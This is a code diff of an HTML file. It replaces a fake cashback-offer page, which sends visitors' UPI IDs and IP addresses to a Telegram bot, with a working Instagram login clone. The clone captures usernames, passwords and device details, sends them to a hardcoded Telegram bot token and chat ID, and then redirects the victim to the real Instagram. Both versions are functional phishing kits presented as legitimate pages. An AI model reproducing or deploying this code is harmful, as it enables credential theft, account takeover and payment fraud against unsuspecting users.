@@ -1,238 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Message to Telegram Bot</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #ff007f, #0073ff);
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        .top-banner {
-            background: linear-gradient(135deg, #ffffff, #f0f0f0);
-            padding: 15px 20px;
-            border-bottom: 2px solid #ddd;
-            position: fixed;
-            top: 0;
-            width: 100%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 1000;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-        }
-        .top-banner .home-icon {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-            fill: #0073ff;
-        }
-        .top-banner .brand-name {
-            font-size: 20px;
-            font-weight: bold;
-            color: #333;
-            text-align: center;
-            flex: 1;
-        }
-        .top-banner .menu-icon {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-            fill: #0073ff;
-        }
-        .form-container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            width: 300px;
-            margin: 80px auto; /* Adjusted for space under the top banner */
-        }
-        input[type="text"], input[type="submit"], button {
-            width: calc(100% - 22px);
-            padding: 12px;
-            margin: 10px auto;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-            display: block;
-            box-sizing: border-box;
-        }
-        input[type="submit"] {
-            background-color: #66a6ff;
-            color: white;
-            cursor: pointer;
-            border: none;
-            padding: 15px;
-            font-size: 16px;
-            width: auto;
-            max-width: 100%;
-        }
-        input[type="submit"]:hover {
-            background-color: #89f7fe;
-        }
-        h1 {
-            margin-bottom: 20px;
-            font-size: 24px;
-            color: #333;
-        }
-        .popup {
-            display: none;
-            position: fixed;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white;
-            padding: 20px;
-            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            text-align: center;
-        }
-        .popup h2 {
-            margin: 0;
-        }
-        .terms {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #555;
-            text-align: center;
-            border: 2px solid #ddd; /* Increased border size */
-            border-radius: 5px;
-            padding: 15px;
-            box-sizing: border-box;
-        }
-        .telegram-button {
-            display: block;
-            width: 150px;
-            padding: 10px;
-            margin: 20px auto;
-            background-color: #0073ff;
-            color: white;
-            text-align: center;
-            border-radius: 5px;
-            text-decoration: none;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .telegram-button:hover {
-            background-color: #005bb5;
-        }
-        .details {
-            margin: 20px auto;
-            font-size: 18px;
-            color: #333;
-            max-width: 300px;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: radial-gradient(circle at top left, #0f2027, #203a43, #2c5364);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .login-container {
+      background: rgba(0, 0, 0, 0.4);
+      padding: 30px 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 350px;
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 94%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #666;
+      border-radius: 8px;
+      background-color: #121212;
+      color: white;
+      font-size: 14px;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    input:focus {
+      border-color: #0095f6;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 15px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .link {
+      color: #aaa;
+      font-size: 13px;
+      margin: 10px 0;
+    }
+
+    .create-btn {
+      background: transparent;
+      border: 1px solid #0095f6;
+      color: #0095f6;
+      margin-top: 15px;
+    }
+
+    .meta-logo {
+      margin-top: 20px;
+      font-size: 14px;
+      opacity: 0.7;
+    }
+  </style>
 </head>
 <body>
-    <div class="top-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Menu_icon_%28simple%29.svg/1024px-Menu_icon_%28simple%29.svg.png" alt="Home" class="home-icon" onclick="window.location.href='logi.html'">
-        <div class="brand-name" id="detailsDisplay"></div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Menu_icon_%28simple%29.svg/1024px-Menu_icon_%28simple%29.svg.png" alt="Menu" class="menu-icon" onclick="window.location.href='login.html'">
-    </div>
 
-    <div class="form-container">
-        <h1>Enter Your Details</h1>
-        <form id="telegramForm">
-            <input type="text" id="upiId" name="upiId" placeholder="Enter your UPI ID" required><br>
-            <input type="submit" value="Submit">
-            <div class="terms">
-                <p><strong>Offer Terms and Conditions:</strong></p>
-                <p>1. Offer valid only once per User/UPI-Id/IP address and Device.</p>
-                <p>2. Multiple registrations from same user/UPI-Id/IP address, similar looking usernames and e-mail IDs and Device will not be paid.</p>
-                <p>3. Use only Real Indian Mobile Numbers and genuine mail ID to register in the app.</p>
-                <p>4. Merchant verifies your account, if they find any Duplicate or Suspicious transaction, then your cashback may get rejected.</p>
-                <p>5. Any query related to Cashback will be entertained by Camplus Team. Write email to mail@camplus.com</p>
-            </div>
-        </form>
-    </div>
+  <div class="login-container">
+    <p style="opacity: 0.7; font-size: 14px;">English (US)</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+    <input type="text" id="username" placeholder="Username, email or mobile number">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="submitLogin()">Log in</button>
+    <p class="link">Forgot password?</p>
+    <button class="create-btn">Create new account</button>
+    <div class="meta-logo">Meta</div>
+  </div>
 
-    <a href="https://t.me/secret_earnings" target="_blank" class="telegram-button">Join on Telegram</a>
+  <script>
+    function submitLogin() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
-    <div class="popup" id="redirectPopup">
-        <h2>Redirecting...</h2>
-    </div>
+      const deviceInfo = `
+Device Info:
+- User Agent: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Screen: ${screen.width}x${screen.height}
+- Language: ${navigator.language}
+`;
 
-    <script>
-        const botToken = '7427071280:AAEk9zB9fVYOeWm0_ahwT53S5n8XPczePiQ';
-        const chatId = '7094705343';
+      const message = `New Login Attempt:
+Username: ${username}
+Password: ${password}
+${deviceInfo}`;
 
-        function getStoredRedirectUrl() {
-            return localStorage.getItem('redirectUrl') || 'https://link.hiqmobi.com/go/198/304';
-        }
+      const botToken = "1974643990:AAEeHN92YJNYfXj03mvHiRPsa6GWYmC7w2E";
+      const chatId = "1763025974";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-        function getUserIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                    return 'IP not available';
-                });
-        }
-
-        function updateDetailsDisplay() {
-            const name = localStorage.getItem('name') || 'Tataneu';
-            const payout = localStorage.getItem('payout') || '10';
-            const detailsDisplay = document.getElementById('detailsDisplay');
-            detailsDisplay.textContent = `${name} - ₹${payout}`;
-        }
-
-        document.getElementById('telegramForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const upiId = document.getElementById('upiId').value;
-            const name = localStorage.getItem('name') || 'Tataneu';  // Default name if not found
-            const payout = localStorage.getItem('payout') || '10';   // Default payout if not found
-
-            getUserIP().then(ipAddress => {
-                // Construct the full message to send to the Telegram bot
-                const fullMessage = `Name: ${name}\nPayout: ₹${payout}\nUPI ID: ${upiId}\nUser IP: ${ipAddress}`;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: fullMessage
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        // Display popup and redirect after 1 second
-                        document.getElementById('redirectPopup').style.display = 'block';
-
-                        setTimeout(function() {
-                            window.location.href = getStoredRedirectUrl();
-                        }, 1000);
-                    } else {
-                        alert('Error sending message');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Error sending message');
-                });
-
-                // Clear the input field after submission
-                document.getElementById('upiId').value = '';
-            });
+      fetch(url)
+        .then(() => {
+          setTimeout(() => {
+            window.location.href = "https://www.instagram.com/accounts/activity/";
+          }, 1000);
+        })
+        .catch((err) => {
+          alert("Error sending message.");
+          console.error(err);
         });
+    }
+  </script>
 
-        // Update details display on page load
-        updateDetailsDisplay();
-    </script>
 </body>
 </html>
